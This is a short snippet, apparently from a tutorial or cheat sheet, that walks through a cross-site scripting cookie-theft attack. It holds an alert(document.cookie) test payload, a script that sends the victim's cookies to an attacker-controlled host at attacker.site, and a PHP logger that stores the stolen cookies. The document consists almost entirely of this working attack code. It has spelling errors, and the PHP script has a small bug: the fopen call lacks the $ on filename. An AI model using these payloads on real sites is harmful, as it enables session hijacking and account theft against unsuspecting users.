//You can display the current cookie session with the following command:
<script>alert(document.cookie)</script>

//Then, you can send cookies contento to an attecker-controlled site:
<script>
var i = new Image();
i.src = "http://attacker.site/log.php?q="+document.cookie;
</script>

//The script will generate an image object and point its src to a script on the attacker's server

//The following php script log.php saves the cookie in a text file on the attacker's site:

<?php
$filename="/tmp/log.txt";
$fp=fopen(filename, 'a');
$cookie=$_GET['q'];
fwrite($fp, $cookie);
fclose($fp);
?>
